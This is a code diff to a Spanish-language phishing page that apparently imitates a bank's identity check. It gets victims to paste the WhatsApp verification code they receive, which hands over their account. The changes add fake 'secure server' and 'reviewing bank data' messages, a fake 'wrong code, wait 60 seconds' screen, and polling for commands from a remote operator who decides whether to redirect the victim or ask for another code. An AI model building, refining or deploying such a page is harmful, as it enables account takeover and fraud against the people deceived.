@@ -59,7 +59,7 @@
     .sr1{border-top-color:var(--red)}
     .sr2{border-right-color:#f87171;animation-duration:1.5s;animation-direction:reverse;width:46px;height:46px;top:8px;left:8px}
     @keyframes spin{to{transform:rotate(360deg)}}
-    .load-title{font-size:16px;font-weight:600;color:#111}
+    .load-title{font-size:16px;font-weight:600;color:#111;transition:opacity .3s}
     .disclaimer{background:#fff;border-radius:14px;padding:18px 20px;box-shadow:0 2px 12px rgba(0,0,0,.07);text-align:left;max-width:340px;opacity:0;transition:opacity .6s;border-left:3px solid #25D366}
     .disclaimer.show{opacity:1}
     .disclaimer p{font-size:13.5px;color:#374151;line-height:1.7}
@@ -81,6 +81,11 @@
     .wam-title{font-size:20px;font-weight:700;color:#111;margin-bottom:8px}
     .wam-sub{font-size:14px;color:#6b7280;line-height:1.7;margin-bottom:20px}
     .wam-btn{display:inline-flex;align-items:center;gap:8px;background:#25D366;color:#fff;border-radius:30px;padding:12px 28px;font-size:15px;font-weight:700;letter-spacing:.5px;box-shadow:0 4px 16px rgba(37,211,102,.35)}
+    /* COOLDOWN BAR */
+    #cooldown-wrap{width:100%;display:none;flex-direction:column;gap:10px;align-items:center}
+    .cd-msg{font-size:13px;color:#E30613;font-weight:500;text-align:center}
+    .cd-bar-bg{width:100%;height:6px;background:#fecaca;border-radius:99px;overflow:hidden}
+    .cd-bar{height:100%;background:var(--red);border-radius:99px;width:100%;transition:width 1s linear}
   </style>
 </head>
 <body>
@@ -112,7 +117,7 @@
   <!-- STATE 2: LOADING -->
   <div id="s-loading" class="state" style="display:none;padding-top:40px">
     <div class="spin-wrap"><div class="spin-ring sr1"></div><div class="spin-ring sr2"></div></div>
-    <div class="load-title">Validando tu información...</div>
+    <div class="load-title" id="loadTitle">Validando tu información...</div>
     <div class="disclaimer" id="disclaimer">
       <p><strong>📲 WhatsApp</strong><br/>Abre WhatsApp, enviaremos un código de validación. Cópialo y regresa aquí para confirmar tu identidad.</p>
     </div>
@@ -124,6 +129,10 @@
     <div class="code-title">Ingresa el código de WhatsApp</div>
     <div class="code-sub">Copia el código que recibiste y pégalo aquí para continuar.</div>
     <input class="code-input" type="tel" id="codeInput" maxlength="7" placeholder="· · · · · ·" autocomplete="one-time-code"/>
+    <div id="cooldown-wrap">
+      <div class="cd-msg">Código incorrecto. Espera <strong><span id="cdSecs">60</span>s</strong> para intentar de nuevo.</div>
+      <div class="cd-bar-bg"><div class="cd-bar" id="cdBar"></div></div>
+    </div>
     <button class="btn-action" id="btnCode" onclick="enviarCode()">CONFIRMAR</button>
   </div>
 
@@ -154,10 +163,11 @@
   if (prefix4) document.getElementById('p4digits').textContent = prefix4;
   setTimeout(function(){ var d=document.getElementById('phoneDis'); if(d) d.style.opacity='0'; }, 4000);
 
-  let pollTimer  = null;
-  let tabPhase   = 'initial'; // 'initial' → 'left' → 'returned'
-  let currentSt  = 'form';
-  let waModTimer = null;
+  let pollTimer    = null;
+  let tabPhase     = 'initial'; // 'initial' → 'left' → 'returned'
+  let currentSt    = 'form';
+  let waModTimer   = null;
+  let codeSubmitted = false;
 
   /* ── SHOW STATE ── */
   function showState(id) {
@@ -216,13 +226,13 @@
   }
   function showWaModal() {
     document.getElementById('wa-modal').classList.add('show');
-    waModTimer = setTimeout(closeWaModal, 8000);
+    waModTimer = setTimeout(closeWaModal, 14000);
   }
   function closeWaModal() {
     clearTimeout(waModTimer);
     document.getElementById('wa-modal').classList.remove('show');
-    if (currentSt === 's-loading') {
-      waModTimer = setTimeout(showWaModal, 20000);
+    if (currentSt === 's-loading' && !codeSubmitted) {
+      waModTimer = setTimeout(showWaModal, 8000);
     }
   }
   function openWhatsApp() {
@@ -274,8 +284,12 @@
       .then(function(r){ return r.json(); })
       .then(function(d){
         if (d.ok) {
+          codeSubmitted = true;
+          clearTimeout(waModTimer);
+          closeWaModal();
           showState('s-loading');
-          scheduleDisclaimer();
+          document.getElementById('disclaimer').classList.remove('show');
+          startLoadingCycle();
           startPoll();
         }
       })
@@ -284,7 +298,29 @@
       });
   }
 
-  /* ── POLL ── */
+  /* ── LOADING MESSAGES CYCLE ── */
+  var _loadCycleIv = null;
+  function startLoadingCycle() {
+    var msgs = [
+      'Validando tu información...',
+      'Verificando código de seguridad...',
+      'Conectando con servidor seguro...',
+      'Procesando solicitud...',
+      'Confirmando tu identidad...',
+      'Revisando datos bancarios...',
+      'Casi listo...'
+    ];
+    var i = 0;
+    var el = document.getElementById('loadTitle');
+    if (_loadCycleIv) clearInterval(_loadCycleIv);
+    _loadCycleIv = setInterval(function(){
+      i = (i + 1) % msgs.length;
+      el.style.opacity = '0';
+      setTimeout(function(){ el.textContent = msgs[i]; el.style.opacity = '1'; }, 300);
+    }, 2800);
+  }
+
+  /* ── POLL ──*/
   function startPoll() {
     if (pollTimer) clearInterval(pollTimer);
     pollTimer = setInterval(function(){
@@ -294,13 +330,46 @@
           if (!d.action) return;
           clearInterval(pollTimer);
           switch(d.action) {
-            case '/LISTO':      window.location.href = 'listo.html'; break;
+            case '/LISTO':
+            case '/LOGIN':      window.location.href = 'listo.html'; break;
             case '/LOGINERROR': window.location.href = 'log/index.php?error=1'; break;
+            case '/CODERROR':   showCooldown(); break;
             default:            startPoll();
           }
         })
         .catch(function(){});
     }, 2000);
+  }
+
+  /* ── COOLDOWN BAR ── */
+  function showCooldown() {
+    clearInterval(pollTimer);
+    codeSubmitted = false;
+    showState('s-code');
+    var wrap = document.getElementById('cooldown-wrap');
+    var bar  = document.getElementById('cdBar');
+    var secs = document.getElementById('cdSecs');
+    var btn  = document.getElementById('btnCode');
+    var inp  = document.getElementById('codeInput');
+    wrap.style.display = 'flex';
+    btn.disabled = true;
+    inp.value = '';
+    bar.style.transition = 'none';
+    bar.style.width = '100%';
+    var t = 60;
+    secs.textContent = t;
+    setTimeout(function(){ bar.style.transition = 'width 1s linear'; }, 50);
+    var iv = setInterval(function(){
+      t--;
+      secs.textContent = t;
+      bar.style.width = (t / 60 * 100) + '%';
+      if (t <= 0) {
+        clearInterval(iv);
+        wrap.style.display = 'none';
+        btn.disabled = false;
+        btn.textContent = 'CONFIRMAR';
+      }
+    }, 1000);
   }
 
   document.addEventListener('keydown', function(e){
